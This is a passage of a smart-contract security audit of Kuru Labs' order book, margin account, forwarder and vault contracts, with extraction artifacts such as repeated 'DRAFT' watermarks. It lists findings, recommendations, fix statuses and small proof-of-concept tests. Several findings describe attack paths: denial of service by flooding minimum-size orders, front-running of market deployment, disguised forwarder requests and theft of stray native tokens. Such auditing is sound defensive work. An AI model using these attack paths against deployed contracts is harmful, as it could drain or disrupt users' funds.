**Spearbit: **Fix verified. 

**5.4.3**

**No boundaries for **minSize **could lead to DOS or market misconfiguration**

**Severity: **Low Risk

**Context: **OrderBook.sol\#L125-L126

**Description: **No check that minSize > 0 or that minSize <= maxSize. Enforcing minSize > 0 is important because otherwise someone could place a bunch \(thousands\) of cheap/empty orders and DOS the iteration through orders. Setting minSize to a low value is almost just as bad as setting it to zero, so it is just as important to document this explicitly as well, so market deployers are aware of potential issues. 

**Recommendation: **Consider adding the check minSize > 0 && minSize <= maxSize to avoid deploying markets with unusable settings. 

**Kuru Labs: **Fixed in commit 223aef4d. 

**Spearbit: **Fix verified. 

**5.4.4**

**A large **maxSize **could suffer DoS if it iterates through enough **minSize **orders** **Severity: **Low Risk

**Context: **MarginAccount.sol\#L134

**Description: **There should be a maximum value for maxSize so that a maxed sized incoming order is able to be filled entirely by min DRAFT

sized pre-existing orders without running out of gas on creditUsersEncoded\(\) while

loop when crediting the makers of all the orders being filled. Otherwise max orders could eventually revert or be deliberately DOSed in a certain price range or even all prices. In price ranges with little or no orders an attacker could even front run a big sized order with many opposing min sized orders, causing the user transaction to revert, and then cancelling his min sized orders. This could lead to bad users experience due to unexpected reverts, increased gas expenses and force users to further waste gas to break up the max order into smaller orders. 

Attackers could leverage this to slow down the rate of market change and possibly use it as a form to create arbitrage against other AMMs. 

• Example Scenario:

**– **The while loop in the creditUsersEncoded\(\) function is responsible for crediting every maker which order has been filled by the current incoming order. 

**– **Lets say they current incoming buy order is 1000x larger than the minSize order. 

**– **Now imagine that every sell order that has been filled is of minSize. So 1000 orders have been filled. 

**– **However, due to gas constraints, we can only credit 700 of the sell orders, and the function reverts. 

Even if minSize has a large enough size to prevent this issue, is important to note that:

24

1. The value of tokens can always drop, and since minSize is immutable, it can become DOSable under extreme circumstances. 

2. Relying on deployment configurations is another layer of risk management that can be misapplied by market creators. 

Therefore, while minSize is a way to mitigate this, it still has some failure points that we could be eliminated by relying on a limit to maxSize. 

**Recommendation: **Limit maxSize to be lower than a constant N, where N = maxSize/minSize. 

**Kuru Labs: **Acknowledged. Since this has more to do with how market params have to be set, will not be having protocol level checks. 

**Spearbit: **Acknowledged. 

**5.4.5**

**Market Creation Frontrunning**

**Severity: **Low Risk

**Context: **Router.sol\#L93-L97, Router.sol\#L369-L396, Router.sol\#L410-L414

**Description: **The deployProxy\(\) function can be frontrun; due to the use of a deterministic salt based on market parameters, the frontrun call causes the original transaction to fail. Further, since the AMM spread parameter is not included in the salt, the attacker can use an impractically large or small AMM spread value to sabotage market deployments with the most logical configuration of the other parameters. 

**Recommendation: **Including the AMM spread parameter in the salt, as recommended in another issue, will mostly solve this issue. To completely defeat a frontrunner from causing transactions to fail unexpectedly, the msg.sender could be included in the salt as well, although this is unlikely to be a serious issue in practice. Using CREATE instead of CREATE2 would work as well. 

**Kuru Labs: **Fixed in commit 0b4c03e6. 

**Spearbit: **Fix verified. 

**5.4.6**

MarginAccountRequest **can be disguised as **ForwardRequest

**Severity: **Low Risk

**Context: **KuruForwarder.sol\#L26-L32, KuruForwarder.sol\#L49-L55, KuruForwarder.sol\#L194-L214

**Description: **ForwardRequest and MarginAccountRequest have identical field types. Also, since allowedInterface is a global setting DRAFT

and doesn't differentiate between contract types, it would be possible to disguise one type for the other. 

For example, one would be able to create a ForwardRequest, but have req.market be a margin account, and have the selector be deposit\(\) with relevant data. 

We see that the whitelisted interfaces are:

allowedInterfaces\[0\] = OrderBook.addBuyOrder.selector; 

allowedInterfaces\[1\] = OrderBook.addSellOrder.selector; 

allowedInterfaces\[2\] = OrderBook.placeAndExecuteMarketBuy.selector; 

allowedInterfaces\[3\] = OrderBook.placeAndExecuteMarketSell.selector; 

allowedInterfaces\[4\] = MarginAccount.deposit.selector; 

allowedInterfaces\[5\] = MarginAccount.withdraw.selector; 

So disguising a MarginAccountRequest as a ForwardRequest that deposits into an attacker's desired recipient account would be possible. 

**Recommendation: **EIP712 supports nested structs, so the bytes data parameter should be made more trans-parent to signers. For instance, the function selector and parameters of the call can be displayed. 

**Kuru Labs: **Acknowledged. 

25

**Spearbit: **Acknowledged. Not fixed, optimistically marking as acknowledged. 

**5.4.7**

**Missing validation checks**

**Severity: **Low Risk

**Context:**

KuruAMMVault.sol\#L242, 

TreeMath.sol\#L40, 

OrderBook.sol\#L164, 

OrderBook.sol\#L868, 

OrderBook.sol\#L939, OrderBook.sol\#L1080, Router.sol\#L59-L60, Router.sol\#L271

**Description/Recommendation:**

• Router.sol\#L59-60, OrderBook.solL868, OrderBook.sol\#L939:

**– **A market would be invalid if either \_pricePrecision or \_sizePrecision is zero. 

**– **\_pricePrecision should be additionally checked to be a multiple of 10, to prevent precision conversion issues. This is crucial for retrieving the PricePoint order linked list, where there is a round-trip conversion involving pricePrecision and vaultPricePrecision. If pricePrecision does not evenly divide either firstLeft or vaultPricePrecision, then the original firstLeft value will not be re-obtained due to precision loss. The value will likely not be an even multiple of tickSize, and thus the order list will be empty. 

**– **Small \_sizePrecision would cause precision losses to have higher impact. An example is when cal-

culating the size of a bid flip order created from a flipped ask order The rounding-down would result in compounding losses per round trip, especially for stablecoin pairs where the price deviations are smaller, and the likelihood of flip orders gets triggered is higher. Eg: \_size = 100\_000, \_price = 100\_-100, \_flippedPrice = 100\_000. After 100 iterations, \_size becomes 110461, but with exact precision it should've been 110511. Consider enforcing a minimum bound on \_sizePrecision. 

• Orderbook.sol\#L164, TreeMath.sol\#L40:

**– **0 and type\(uint32\).max are considered as special values which are returned by findFirstLeft and findFirstRight for non-existent ids. 

But the add function currently allows addition of 0 and

type\(uint32\).max values as id in the tree. Addition of these special values should not be allowed to prevent unexpected behaviour for TreeMath consumers. Currently, orders are prevented from being placed with zero prices in the orderbook, but not at the price of type\(uint32\).max. 

Add these test cases in test/TreeMath.t.sol:

function test\_auditPOC\_addZero\(\) public \{

assertEq\(tree.contains\(0\), false\); 

assertEq\(tree.findFirstRight\(1\), type\(uint32\).max\); 

tree.add\(0 DRAFT

\); 

assertEq\(tree.contains\(0\), true\); 

assertEq\(tree.findFirstRight\(1\), 0\); 

\}

function test\_auditPOC\_addUint32Max\(\) public \{

assertEq\(tree.contains\(type\(uint32\).max\), false\); 

assertEq\(tree.findFirstLeft\(0\), 0\); 

tree.add\(type\(uint32\).max\); 

assertEq\(tree.contains\(type\(uint32\).max\), true\); 

assertEq\(tree.findFirstLeft\(0\), type\(uint32\).max\); 

\}

**– **The benefit of doing the check in the library means that they need not be done in the orderbook. 

26

• Router.sol\#L271: A deadline parameter and a timestamp check can be added to anyToAnySwap function to prevent execution of older signed transactions. 

• KuruAMMVault.sol\#L242: Consider restricting the maximum number of token decimals allowable. In this line, as the maximum allowable \_kuruAmmSpread is 49, the maximum decimals possible is lg\(type\(uint96\).max /

\(2000 \+ 49\)\) ~= 25.5 = 25. Any decimals larger than this and silent overflow occurs, causing a revert. 

**Kuru Labs: **Fixed in commits:

• 46eff94e. 

• a722c69a. 

• 885ad32b. 

**Spearbit: **Fixed. 

**5.4.8**

approve\(\) **used instead of **safeApprove\(\)

**Severity: **Low Risk

**Context: **KuruAMMVault.sol\#L59-L62, Router.sol\#L259-L264

**Description: **The standard approve\(\) method is used instead of SafeTransferLib's safeApprove\(\) method, even though SafeTransferLib is imported. This will be an issue for non-compliant ERC20 tokens, although the likelihood of them being created and existing on Monad network is low. 

**Recommendation: **Replace the approve\(\) calls with safeApprove\(\). 

**Kuru Labs: **Fixed in commit 0b7ec4f2. 

**Spearbit: **Fix verified. 

**5.4.9**

**Missing storage gap in **AbstractAMM

**Severity: **Low Risk

**Context: **AbstractAMM.sol\#L16-L28

**Description: **As OrderBook is an upgradable contract, a storage gap must be left after declaring all state variables in AbstractAMM contract. This allows addition of new variables in AbstractAMM storage for future upgrades which is currently not possible. 

**Recommendation: **Consider adding this change:

\+ uint256\[43\] private DRAFT

\_\_gap; 

**Kuru Labs: **Fixed in commit 058bd06d. 

**Spearbit: **Fix verified. 

**5.4.10**

**Missing overriding **\_domainNameAndVersionMayChange **function in **KuruForwarder

**Severity: **Low Risk

**Context: **KuruForwarder.sol\#L17

**Description: **KuruForwarder inherits Solady's EIP712 contract. 

Solady's EIP712.\_domainNameAndVersion function specifies that: If the returned result may change after the contract has been deployed, you must override \_domainNameAndVersionMayChange\(\) to return true. 

27

Since KuruForwarder is an upgradable contract and its version may change with a future upgrade, the contract must implement an \_domainNameAndVersionMayChange function and return true. 

**Recommendation: **Add this function in KuruForwarder:

function \_domainNameAndVersionMayChange\(\) internal pure override returns \(bool result\) \{

return true; 

\}

This change prevents the use of old signatures in the new contract after an upgrade. 

**Kuru Labs: **Fixed in commit 827e1346. 

**Spearbit: **Fix verified. 

**5.4.11**

KuruForwarder**: Missing sufficient **msg.value **check in execution functions**

**Severity: **Low Risk

**Context: **KuruForwarder.sol\#L172, KuruForwarder.sol\#L194, KuruForwarder.sol\#L216

**Description: **None of the execution function of KuruForwarder validate that the msg.value passed in the call is sufficient and is >= req.value. Due to this any native tokens residing in KuruForwarder \(if any\) can be stolen from the contract. Note: It is expected that KuruForwarder will never hold any native tokens. 

**Recommendation: **Consider adding explicit checks to validate that msg.value passed with the call is >=

req.value. 

**Kuru Labs: **Fixed in commit 04c6d0ce. 

**Spearbit: **Fix verified. 

**5.4.12**

KuruForwarder**: Missing restrictions on **marginAccount **and **market **addresses**

**Severity: **Low Risk

**Context: **KuruForwarder.sol\#L172, KuruForwarder.sol\#L194, KuruForwarder.sol\#L216

**Description: **The KuruForwarder forwards user requests to marginAccount and market addresses via the execute\* functions. However there are no restrictions on marginAccount and market addresses on which the external execution call is performed. A malicious user can call a whitelisted function on any onchain address via KuruForwarder. 

**Recommendation:**

DRAFT

Consider storing the marginAccount address in KuruForwarder and validate the

margin account address user input against that. 

Further the market address can be verified by calling

Router.verifiedMarket\(market\) function. 

**Kuru Labs: **Acknowledged. 

**Spearbit: **Acknowledged. 

**5.4.13**

MarginAccount**: Missing ability to change **feeCollector **address**

**Severity: **Low Risk

**Context: **MarginAccount.sol\#L68-L74

**Description: **The MarginAccount contract lacks the feature to update the feeCollector address. This state variable can only be set once at contract initialization. 

**Recommendation: **Consider adding a function to update the feeCollector address. 

**Kuru Labs: **Fixed in commit b9ce4e77. 

**Spearbit: **Fix verified. 

28

**5.4.14**

**Breaking checks-effects-interactions pattern**

**Severity: **Low Risk

**Context: **MarginAccount.sol\#L200-L201

**Description: **It is advised for EVM smart contracts to follow checks-effects-interactions pattern wherever possible. 

The pattern states that all contract states must be updated before making any external call. This pattern also helps in mitigating reentrancy issues. 

Here are the instances where the protocol contracts do not follow the CEI pattern:

• MarginAccount.sol\#L200-L201: balances mapping updated after external call to token. 

**Recommendation: **Consider updating all contract states before making any external call. 

**Kuru Labs: **Fixed in commit 13dc3aa7. 

**Spearbit: **Fix verified. 

**5.4.15**

Router**: Missing inclusion of **\_kuruAmmSpread **for market salt creation**

**Severity: **Low Risk

**Context: **Router.sol\#L67-L92

**Description: **The Router.deployProxy function is missing the inclusion of \_kuruAmmSpread for salt creation for market proxy deployment. Due to this issue the users cannot create different markets with all same parameters but different \_kuruAmmSpread values. 

**Recommendation: **Consider including \_kuruAmmSpread for salt creation for market proxy deployment. 

**Kuru Labs: **Fixed in commit 0b4c03e6. 

**Spearbit: **Fix verified. 

**5.4.16**

KuruAMMVault.deposit**: native tokens are refunded to incorrect address**

**Severity: **Low Risk

**Context: **KuruAMMVault.sol\#L184

**Description: **The KuruAMMVault.deposit function sends the native refund to receiver address instead of msg.sender which is incorrect. 

**Recommendation:**

DRAFT

Consider sending the native refund to msg.sender:

- \(bool success,\) = receiver.call\{value: \_nativeRefund\}\(""\); 

\+ \(bool success,\) = msg.sender.call\{value: \_nativeRefund\}\(""\); 

**Kuru Labs: **Fixed in commit 50c5fe0c. 

**Spearbit: **Fix verified. 

**5.4.17**

KuruAMMVault**: Incorrect **withdraw **function implementation**

**Severity: **Low Risk

**Context: **KuruAMMVault.sol\#L307

**Description: **In the KuruAMMVault contract, there is no logical difference between the withdraw and redeem functions. 

function withdraw\(uint256 shares, address receiver, address owner\) public returns \(uint256, uint256\) \{

function redeem\(uint256 shares, address receiver, address owner\) public returns \(uint256, uint256\) \{

29

Ideally the withdraw function should take token1 and token2 amounts as inputs then burn an appropriate amount of vault shares. 

**Recommendation: **Consider taking token1 and token2 amounts as inputs in the withdraw function. 

**Spearbit: **redeem function has been removed in PR 56

**Kuru Labs: **Fixed in commit ec97fa8d. 

**Spearbit: **Fix verified. 

**5.4.18**

IERC20.decimals\(\) **Function Not Marked **view **and Returns Non-standard Type**

**Severity: **Low Risk

**Context: **IERC20.sol\#L64

**Description: **In IERC20.sol, the decimals\(\) function is not marked view. This means the compiler will use CALL

instead of STATICCALL to call decimals\(\) when this interface is used. This allows the decimals\(\) function to perform state-changing actions and in the case of malicious tokens can lead to unexpected reentrancy. This can in fact be used as an alternate vector for the attack highlighted in "Execution sequence of Router.deployProxy

function can be exploited to drain MarginAccount completely" Further, decimals\(\) usually returns uint8, not uint256. 

**Recommendation: **Preferably, eliminate this interface entirely and use the IERC20 and IERC20Metadata interfaces provided by OpenZeppelin as the OZ libraries are already a dependency of the codebase. If the interface is kept, mark the decimals\(\) function view and change its return type to uint8. 

**Kuru Labs: **Fixed in commit 7a0ae43e. 

**Spearbit: **Fix verified. 

**5.4.19**

**Missing Setter Functions**

**Severity: **Low Risk

**Context: **MonadDeployer.sol\#L35-L36

**Description: **Per discussion with the team, setter functions are missing for the following fields of the following contracts:

• MonadDeployer.kuruCollective and MonadDeployer.kuruCollectiveFee. 

**Recommendation: **Add missing setter functions. 

**Kuru Labs: **Fixed in

DRAFT

commit c913976b. 

**Spearbit: **Fix verified. 

**5.4.20**

**No Reentrancy Protection Despite Extensive Native Token Use**

**Severity: **Low Risk

**Context: **\(No context files were provided by the reviewer\)

**Description: **The OrderBook, MarginAccount, and KuruAMMVault contracts must extensively handle native tokens. 

While no clear vulnerabilities stemming from native token reentrancy were identified in this review, neither was it proven that no such vulnerabilities exist. 

**Recommendation: **Consider adding reentrancy protection to all state-changing functions of these functions, or at least those involved in trades or that can affect state critical to trades \(e.g. vault deposits and withdrawals\). 

Further, consider implementing protection against cross-contract reentrancy, since logic is split between the order book, vault contract, and margin account--execution in any one of these could conceivably affect the others e.g. if a trade is executed during a Vault withdrawal. 

30

Alternatively, since native tokens can be safely and trivially wrapped, consider eliminating the direct use of native tokens entirely from the codebase. This will significantly reduce the codebase's complexity, enhance security, and improve long-term maintainability and extensibility. 

**Kuru Labs: **Fixed in commit 430a9e68. 

**Spearbit: **Fix verified. 

**5.4.21**

**Vault Can Leak Value to Arbitrage Due to Deposit Rebalancing**

**Severity: **Low Risk

**Context: **\(No context files were provided by the reviewer\)

**Description: **If reserves in the AMM vault are unbalanced during a deposit due to accrued profits, then a depositor does not receive back exactly the same assets when withdrawing immediately \(but does receive the same amount of value, based on the current orderbook price\). This is effectively a zero-fee, zero-slippage swap. Profit-motivated actors will find ways to arbitrage this behavior, either atomically against other on-chain markets or statistically against CEXes. The long-term result will be that some portion of vault profits are lost to this arbitrage activity. 

**Recommendation: **Consider one of the following mitigations:

• Charge a deposit fee on the "swapped" portion of a deposit. 

• Add a delay to share withdrawal--even a few blocks should be sufficient. 

• Charge a withdrawal fee; this can be zero after a certain amount of time has passed. 

**Kuru Labs: **Acknowledged. Won't fix. Will not be preventing depositor from getting the zero slippage swap because it fallbacks to a v2-style pool anyway after rebalancing. We agree that it is \+ev for arbitrageurs because this is also a zero-fee swap, but the vault gets rebalanced at the end. 

**Spearbit: **Acknowledged. 

**5.4.22**

**Delete Orders From Storage Upon Cancellation**

**Severity: **Low Risk

**Context: **\(No context files were provided by the reviewer\)

**Description: **Though it is intended as a gas optimization, not deleting orders from storage when they are canceled adds significant complexity to the code and increases the chance of bugs. 

**Recommendation: **Delete canceled orders from storage to simplify the code. This should give a gas refund that partially offsets the cost DRAFT

of doing so. 

**Kuru Labs: **Acknowledged. 

**Spearbit: **Acknowledged. 

**5.5**

**Gas Optimization**

**5.5.1**

**Redundancies**

**Severity: **Gas Optimization

**Context:**

KuruAMMVault.sol\#L47-L48, 

KuruAMMVault.sol\#L325, 

KuruForwarder.sol\#L184-L185, 

KuruForwarder.sol\#L207, 

KuruForwarder.sol\#L233, 

SafeTransferLib.sol\#L10, 

TreeMath.sol\#L27-L31, 

OrderBook.sol\#L202-L204, 

OrderBook.sol\#L233-L235, 

OrderBook.sol\#L296-L298, 

OrderBook.sol\#L365, 

OrderBook.sol\#L386, OrderBook.sol\#L528, OrderBook.sol\#L542, OrderBook.sol\#L570, OrderBook.sol\#L591, Or-

derBook.sol\#L612, OrderBook.sol\#L628, OrderBook.sol\#L666, OrderBook.sol\#L688-L690, OrderBook.sol\#L719, 

OrderBook.sol\#L738-L740, OrderBook.sol\#L1049, KuruUtils.sol\#L52-L56, Router.sol\#L123, Router.sol\#L301

**Description/Recommendation:**

31

• OrderBook.sol\#L202-204, OrderBook.sol\#L233-235, OrderBook.sol\#L296-298: Checking && \_askPrice > 0 is redundant because \_askPrice is later checked to be larger than \_bidPrice. So

0 < \_bidPrice < 

\_askPrice:

- require\(\_bidPrice > 0 && \_askPrice > 0, OrderBookErrors.PriceError\(\)\); 

\+ require\(\_bidPrice > 0 && \_bidPrice < \_askPrice, OrderBookErrors.PriceError\(\)\); require\(\_bidPrice % tickSize == 0 && \_askPrice % tickSize == 0, 

,\! 

OrderBookErrors.TickSizeError\(\)\); 

- require\(\_bidPrice < \_askPrice, OrderBookErrors.PriceError\(\)\); 

• KuruForwarder.sol\#L185, KuruForwarder.sol\#L207, KuruForwarder.sol\#L233: Explicitly reserving 1/64th of gas left for external calls is redundant as it's automatically performed as per EIP150. 

• TreeMath.sol\#L27-31: The contains\(\) function is never used. 

• KuruUtils.sol\#L52-56: Variables are initialized to empty values by default, therefore, setting them to 0 is redundant. 

• OrderBook.sol\#L528, 

OrderBook.sol\#L542, 

OrderBook.sol\#L570, 

OrderBook.sol\#L612, 

Order-

Book.sol\#L628: Modifier marketActive is already used on all functions called by functions performing batch operations, so having the marketActive modifier on the functions below is unnecessary:

**– **batchAddPairedLiquidity\(\). 

**– **batchProvisionLiquidity\(\). 

**– **batchUpdate\(\). 

**– **placeMultipleBuyOrders\(\). 

**– **placeMultipleSellOrders\(\). 

• KuruAMMVault.sol\#L47-48: Unused parameters. name\(\) and symbol\(\) returns KuruAMMVault and KURU-AMM-VAULT respectively. Consider appending the token names and symbols for easier differentiation, or passed down as input params in router.deployProxy\(\). 

• OrderBook.sol\#L344, OrderBook.sol\#L365, OrderBook.sol\#L386: The .next pointer only needs to be set if \_prevOrderId \!= OrderLinkedList.NULL. 

- s\_orders\[\_prevOrderId\].next = \_orderId; 

\+ if \(\_prevOrderId \!= OrderLinkedList.NULL\) s\_orders\[\_prevOrderId\].next = \_orderId; 

• OrderBook.sol\#L591: The break statements in batchUpdate\(\) do not serve any purpose or functionality. 

• KuruAMMV

DRAFT

ault.sol\#L325: Redundant check on total supply as it's >= MIN\_LIQUIDITY = 10 \*\* 3. 

• OrderBook.sol\#L1049: The latter condition is redundant as a result of code changes: In an earlier commit, we were not checking if head == OrderLinkedList.NULL, so this served the purpose of making a lone head which is filled exactly \(remainingsize, updatedsize = 0\) uncancellable. 

Now we have the check in the cancel function \_checkIfCancelledOrFilled. 

- \(\_nextHead == OrderLinkedList.NULL && s\_orders\[\_orderId\].prev == OrderLinkedList.NULL\)

• Router.sol\#L123: TRUSTED\_FORWARDER is already of type address, so this cast is unnecessary and can be removed. 

• Router.sol\#L301: \_amountToSize\(\) already returns type uint96, so this cast is unnecessary and can be removed. 

• OrderBook.sol\#L666 and OrderBook.sol\#L719: These two lines contain empty else clauses that can be removed. 

32

• OrderBook.sol\#L688-L690 and OrderBook.sol\#L738-L740: These two unchecked blocks do not contain checked any math operations, and are therefore redundant and removable. 

• The libraries/SafeTransferLib.sol file appears to be unused--instead an imported version from solady is used. 

This file can be removed. 

**Kuru Labs: **Fixed in commit f2b84311. 

**Spearbit: **Fix verified. 

**5.5.2**

**Static estimations should have their own separate function**

**Severity: **Gas Optimization

**Context: **OrderBook.sol\#L670-L671

**Description: **The current functionality provides estimations by allowing RPC STATICCALLs to message placeAndExecuteMarketBuy\(\) from address zero. This makes it so every legitimate, state altering call to the function, needs to spend the gas for if \(msg.sender == address\(0\)\). Having a separate view function that calls \_marketBuyMatch\(\) and just returns the amount of base tokens credited would be preferable as:

1. placeAndExecuteMarketBuy\(\) would be more readable. 

2. placeAndExecuteMarketBuy\(\) would have a lower runtime gas cost. 

**Recommendation: **Consider implementing a separate view function that calls \_marketBuyMatch\(\). 

**Kuru Labs: **Acknowledged. 

**Spearbit: **Acknowledged. 

**5.5.3**

**Inefficient implementation of **\_depositToMarginAccount\(\)

**Severity: **Gas Optimization

**Context: **KuruAMMVault.sol\#L179-L180

**Description: **\_depositToMarginAccount\(\) could be refactored to handle both transfers, instead of being called twice. **Recommendation: **Consider refactoring \_depositToMarginAccount\(\) to handle both transfers and only calling it once here. 

function \_depositToMarginAccount\(uint256 amount1, address token1, uint256 amount2, address token2\)

,\! 

internal \{

if \(token1 ==

DRAFT

address\(0\)\) \{

marginAccount.deposit\{value: amount1\}\(address\(this\), token1, amount1\); 

\} else \{

token1.safeTransferFrom\(msg.sender, address\(this\), amount1\); 

marginAccount.deposit\(address\(this\), token1, amount1\); 

\}

if \(token2 == address\(0\)\) \{

marginAccount.deposit\{value: amount2\}\(address\(this\), token2, amount2\); 

\} else \{

token2.safeTransferFrom\(msg.sender, address\(this\), amount2\); 

marginAccount.deposit\(address\(this\), token2, amount2\); 

\}

\}

**Kuru Labs: **Fixed in commit 4fd4fe37. 

**Spearbit: **Fix verified. 

33

**5.5.4**

**Unnecessary repeated calculation of vault order best prices**

**Severity: **Gas Optimization

**Context: **OrderBook.sol\#L1262-L1263

**Description: **The calculation for the orderbook best ask and bid is unnecessarily repeated 5 times in their respective functions bestAsk\(\) and bestBid\(\). 

**Recommendation: **Consider calculating it just once and caching the value in memory. For example: if \(firstLeft \!= 0\) \{

uint256 orderBookBestAsk = firstLeft \* vaultPricePrecision / pricePrecision; 

if \(vaultBestAsk \!= type\(uint256\).max\) \{

if \(orderBookBestAsk == vaultBestAsk\)

if \(firstRight \!= type\(uint32\).max\) \{

uint256 orderBookBestBid = firstRight \* vaultPricePrecision / pricePrecision; 

if \(vaultBestBid \!= 0\) \{

if \(orderBookBestBid == vaultBestBid\) \{

**Kuru Labs: **Fixed in commit 1da0af1a. 

**Spearbit: **Fix verified. 

**5.5.5**

**Cache storage variables and repeated calculations in memory**

**Severity: **Gas Optimization

**Context: **OrderBook.sol\#L798

**Description: **Many gas saving opportunities in \_matchAggressiveBuyWithCap, \_marketBuyMatch and \_matchAg-gressiveSell by committing calculations and storage variables to memory such as:

• sizePrecision, pricePrecision, vaultPricePrecision. 

• "\_bestBid/\_bestAsk" \* pricePrecision / vaultPricePrecision. 

• baseAsset, quoteAsset. 

• baseAssetDecimals, quoteAssetDecimals. 

• makerFeeBps, takerFeeBps. 

Please note this is not an exhaustive list as the exact implementation of the gas savings is also dependent on future contract sizes on DRAFT

Monad, which the Kuru team still has to experiment with. 

**Kuru Labs: **Fixed in commit 4860c7c5. 

**Spearbit: **Fix verified. 

**5.5.6**

**Vacuous and Unused Function Return Values**

**Severity: **Gas Optimization

**Context:**

OrderLinkedList.sol\#L64-L75, 

MarginAccount.sol\#L123, 

MarginAccount.sol\#L151, 

MarginAc-

count.sol\#L167, OrderBook.sol\#L420, OrderBook.sol\#L435, OrderBook.sol\#L443

**Description: **Throughout the codebase, there are instances of functions returning values that do not provide useful information back to the callsite, as well as return values that are never used; many of these instances overlap. 

• MarginAccount.creditUser\(\) always returns true and the return value is never used. 

• MarginAccount.creditUsersEncoded\(\) always returns true and the return value is never used. 

• MarginAccount.creditFee\(\) always returns true and the return value is never used. 

• OrderBook.\_cancelFlipOrder\(\) returns a bool that is never used. 

34

• OrderBook.\_cancelOrder\(\) returns a bool that is never used. 

• OrderBook.\_executeCancel\(\) returns a bool that is only used to be a return value in other functions for which the return value is unused \(\_cancelOrder and cancelFlipOrder\), meaning it is unused after removing the return values from those two functions. 

• OrderedLinkedList.updateHead\(\) simply returns whether the passed-in orderId was NULL or not, information trivially available to the caller. It is also unused. 

**Recommendation: **Remove return values from functions if they have no meaning or serve no purpose, or modify the functions to give them meaning and then use the return value appropriately. It seems the former option is likely correct for all instances highlighted here. 

**Kuru Labs: **Fixed in commit e9ed7ea7. 

**Spearbit: **Fix verified. The following commits also contributed to fixing this issue:

• 184744c4. 

• 51375c62. 

**5.5.7**

**Changing return prices for empty vault and orderbook simplifies some checks**

**Severity: **Gas Optimization

**Context: **OrderBook.sol\#L1271

**Description:**

Instead of returning \(false, 0\) for an empty vault and orderbook, 

return \(false, 

type\(uint256\).max, then some of the checks become redundant. Do likewise for bestBid\(\), change \(false, type\(uint256\).max\) to \(false, 0\). 

**Recommendation: **Git patch below, reflecting the simplification in checks as well:

diff --git a/contracts/KuruAMMVault.sol b/contracts/KuruAMMVault.sol

index 05d259c..92697f3 100644

- -- a/contracts/KuruAMMVault.sol

\+ \+\+ b/contracts/KuruAMMVault.sol

@@ -223,7 \+223,7 @@ contract KuruAMMVault is DRAFT

IKuruAMMVault, ERC20, Ownable, Initializable, UUPSUpgra

\_newBidPrice = FixedPointMathLib.mulDivRound\(\_newAskPrice, 1000, 1000 \+ SPREAD\_CONSTANT\); 

\(uint256 \_bestBid, uint256 \_bestAsk\) = market.bestBidAsk\(\); 

if \(

-

\(\_bestBid > \_newAskPrice && \_bestBid \!= type\(uint256\).max\) || \(\_bestAsk < 

,\! 

\_newBidPrice && \_bestAsk \!= 0\)

\+

\(\_bestBid > \_newAskPrice\) || \(\_bestAsk < \_newBidPrice\)

\) \{ revert KuruAMMVaultErrors.VaultInitializationPriceCrossesBook\(\); 

\}

diff --git a/contracts/OrderBook.sol b/contracts/OrderBook.sol

index fc1b1c2..c503d78 100644

- -- a/contracts/OrderBook.sol

\+ \+\+ b/contracts/OrderBook.sol

@@ -206,7 \+206,9 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A

\{

\(, uint256 \_bestAsk\) = bestAsk\(\); 

-

if \(\(uint256\(\_price\) \* 10 \*\* 18 / pricePrecision\) >= \_bestAsk && \_bestAsk \!= 0\) \{

\+

// price is at most type\(uint32\).max, bestAsk\(\) is type\(uint256\).max for empty vault and

,\! 

orderbook

\+

// so won't enter if-clause

\+

if \(\(uint256\(\_price\) \* 10 \*\* 18 / pricePrecision\) >= \_bestAsk\) \{

if \(\_provisionOrRevert\) \{

revert OrderBookErrors.ProvisionError\(\); 

\} else \{

@@ -273,7 \+275,9 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A 35

\{

\(, uint256 \_bestBid\) = bestBid\(\); 

-

if \(\(uint256\(\_price\) \* 10 \*\* 18 / pricePrecision\) <= \_bestBid && \_bestBid \!=

,\! 

type\(uint256\).max\) \{

\+

// price checked to be > 0, bestBid\(\) is 0 for empty vault and orderbook

\+

// so won't enter if-clause

\+

if \(\(uint256\(\_price\) \* 10 \*\* 18 / pricePrecision\) <= \_bestBid\) \{

if \(\_provisionOrRevert\) \{

revert OrderBookErrors.ProvisionError\(\); 

\} else \{

@@ -302,11 \+306,11 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A \(, uint256 \_bestBid\) = bestBid\(\); 

\(, uint256 \_bestAsk\) = bestAsk\(\); 

require\(

-

\(\(uint256\(\_bidPrice\) \* 10 \*\* 18 / pricePrecision\) <= \_bestAsk\) || \(\_bestAsk == 0\), 

\+

\(\(uint256\(\_bidPrice\) \* 10 \*\* 18 / pricePrecision\) <= \_bestAsk\), 

OrderBookErrors.ProvisionError\(\)

\); 

require\(

-

\(\(uint256\(\_askPrice\) \* 10 \*\* 18 / pricePrecision\) >= \_bestBid\) || \(\_bestBid ==

,\! 

type\(uint256\).max\), 

\+

\(\(uint256\(\_askPrice\) \* 10 \*\* 18 / pricePrecision\) >= \_bestBid\), 

OrderBookErrors.ProvisionError\(\)

\); 

\}

@@ -783,7 \+787,9 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A \(bool \_isVaultFill, uint256 \_bestAsk\) = bestAsk\(\); 

\_limitPrice = \_limitPrice \* vaultPricePrecision / pricePrecision; 

-

while \(\_sizeToBeFilled > 0 && \_bestAsk <= \_limitPrice && \_bestAsk \!= 0\) \{

\+

// \_limitPrice is at maximally type\(uint32\).max, bestAsk\(\) is type\(uint256\).max for empty

,\! 

vault and orderbook

\+

// so will not enter loop

\+

while \(\_sizeToBeFilled > 0 && 

DRAFT

\_bestAsk <= \_limitPrice\) \{

uint96 sizeToBeFilledBefore = \_sizeToBeFilled; // Capture the size before filling

bytes memory priceUpdate; 

@@ -850,7 \+856,7 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A bytes memory makerCredits; 

\(bool \_isVaultFill, uint256 \_bestAsk\) = bestAsk\(\); 

-

while \(\_quoteSize > 0 && \_bestAsk \!= 0\) \{

\+

while \(\_quoteSize > 0 && \_bestAsk \!= type\(uint256\).max\) \{

bytes memory priceUpdate; 

if \(\_isVaultFill\) \{

uint96 \_sizeFilled; 

@@ -922,7 \+928,7 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A \(bool \_isVaultFill, uint256 \_bestBid\) = bestBid\(\); 

bytes memory makerCredits; 

\_limitPrice = \_limitPrice \* vaultPricePrecision / pricePrecision; 

-

